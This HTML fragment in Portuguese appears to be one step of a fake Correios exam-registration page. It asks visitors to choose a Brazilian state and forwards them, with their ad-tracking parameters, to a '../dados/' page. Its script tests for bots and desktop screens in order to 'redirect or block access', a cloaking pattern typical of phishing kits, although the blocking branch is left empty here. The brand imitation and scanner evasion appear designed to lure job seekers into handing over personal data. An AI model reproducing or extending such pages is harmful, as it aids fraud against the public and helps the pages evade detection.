    <script>
      // Função para detectar se é um dispositivo móvel
      function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      }
      // Função para detectar se é um bot
      function isBot() {
        return botAgents.some(bot => navigator.userAgent.includes(bot));
      }
      // Função para verificar se a largura da janela é maior que 768px
      function isWideScreen() {
        return window.innerWidth > 768;
      }
      // Redirecionar ou bloquear o acesso
      function checkAccess() {
        if (isBot() || (!isMobile() && isWideScreen())) {
        }
      }
      // Executar a função de verificação ao carregar a página
      window.onload = checkAccess;
      // Adicionar um listener para verificar novamente se a janela for redimensionada
      window.addEventListener('resize', checkAccess);
    </script>

    <!-- Atualize o atributo action para apontar para o diretório desejado -->
    <form id="inscricaoForm" method="POST" action="../dados/index.html">
      <div class="mb-6">
        <h2 class="text-lg font-bold text-correios-blue mb-2">Selecione seu Estado</h2>
        <p class="text-gray-600">Escolha o estado onde deseja realizar as provas:</p>
      </div>
      
      <div class="relative">
        <select name="estado" class="block w-full p-3 border border-gray-300 rounded-lg focus:ring-correios-blue focus:border-correios-blue appearance-none cursor-pointer pr-10" required="">
          <option value="Bahia - BA" selected="">Bahia - BA</option>
          <option value="Acre - AC">Acre - AC</option>
          <option value="Alagoas - AL">Alagoas - AL</option>
          <option value="Amapá - AP">Amapá - AP</option>
          <option value="Amazonas - AM">Amazonas - AM</option>
          <option value="Ceará - CE">Ceará - CE</option>
          <option value="Distrito Federal - DF">Distrito Federal - DF</option>
          <option value="Espírito Santo - ES">Espírito Santo - ES</option>
          <option value="Goiás - GO">Goiás - GO</option>
          <option value="Maranhão - MA">Maranhão - MA</option>
          <option value="Mato Grosso - MT">Mato Grosso - MT</option>
          <option value="Mato Grosso do Sul - MS">Mato Grosso do Sul - MS</option>
          <option value="Minas Gerais - MG">Minas Gerais - MG</option>
          <option value="Pará - PA">Pará - PA</option>
          <option value="Paraíba - PB">Paraíba - PB</option>
          <option value="Paraná - PR">Paraná - PR</option>
          <option value="Pernambuco - PE">Pernambuco - PE</option>
          <option value="Piauí - PI">Piauí - PI</option>
          <option value="Rio de Janeiro - RJ">Rio de Janeiro - RJ</option>
          <option value="Rio Grande do Norte - RN">Rio Grande do Norte - RN</option>
          <option value="Rio Grande do Sul - RS">Rio Grande do Sul - RS</option>
          <option value="Rondônia - RO">Rondônia - RO</option>
          <option value="Roraima - RR">Roraima - RR</option>
          <option value="Santa Catarina - SC">Santa Catarina - SC</option>
          <option value="São Paulo - SP">São Paulo - SP</option>
          <option value="Sergipe - SE">Sergipe - SE</option>
          <option value="Tocantins - TO">Tocantins - TO</option>
        </select>
        <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
          <i class="fas fa-chevron-down"></i>
        </div>
      </div>
      
      <button type="submit" id="submitBtn" class="bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
        <span>Prosseguir com a Inscrição</span>
        <i class="fas fa-arrow-right ml-2"></i>
      </button>
    </form>
  </div>

<div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">

<script>
  document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("inscricaoForm");

    form.addEventListener("submit", function (event) {
      event.preventDefault(); // Impede o envio padrão do formulário

      // Captura os parâmetros já existentes na URL (UTM e demais)
      const currentParams = new URLSearchParams(window.location.search);

      // Obtém o estado selecionado
      const estadoSelecionado = document.querySelector('select[name="estado"]').value;
      
      // Atualiza o parâmetro "estado" com o valor selecionado
      currentParams.set("estado", estadoSelecionado);

      // Constrói a nova URL apontando para o diretório desejado (../dados/index.html)
      const newUrl = `../dados/index.html?${currentParams.toString()}`;
      
      // Redireciona para a nova URL com os parâmetros atualizados
      window.location.href = newUrl;
    });
  });
</script>
